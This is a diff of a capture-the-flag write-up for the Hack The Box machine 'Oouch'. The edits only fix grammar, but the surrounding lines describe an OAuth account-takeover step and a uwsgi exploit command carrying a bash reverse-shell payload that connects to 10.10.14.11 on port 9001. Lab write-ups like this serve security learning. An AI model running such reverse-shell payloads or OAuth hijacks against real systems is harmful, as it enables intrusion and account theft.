@@ -222,7 +222,7 @@ textfield=http://consumer.oouch.htb:5000/oauth/connect/token?code=0YbvZ56PVc90ZM
 ![Sending Authorization request](oouch_web-7.png)
 
 After a while the link gets clicked and the _Profile_ shows that no accounts are connected.
-When authorizing to the account again at _consumer.oouch.htb:5000/oauth/login_ and go browse to the _Profile_, it will be the account of the user that clicked the link that we sent:
+When authorizing to the account again at _consumer.oouch.htb:5000/oauth/login_ and browse to the _Profile_, it will be the account of the user that clicked the link that we sent:
 
 ![Becoming another user](oouch_web-8.png)
 
@@ -518,13 +518,13 @@ Executing the exploit:
 python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c 'bash -c "bash -i >& /dev/tcp/10.10.14.11/9001 0>&1"'
 ```
 
-> NOTE: The exploit wants to import the _bytes_ module, so the lines were it is imported should be removed:
+> NOTE: The exploit wants to import the _bytes_ module, so the lines where it is imported should be removed:
 
 ```
 sed '/import b/d' uwsgi_exp.py -i
 ```
 
-After sending the command, the listener on my IP and port starts a reverse shell sessions as _www-data_ on the **Flask container**.
+After sending the command, the listener on my IP and port 9001 starts a reverse shell sessions as _www-data_ on the **Flask container**.
 
 #### Exploiting DBus with www-data
 
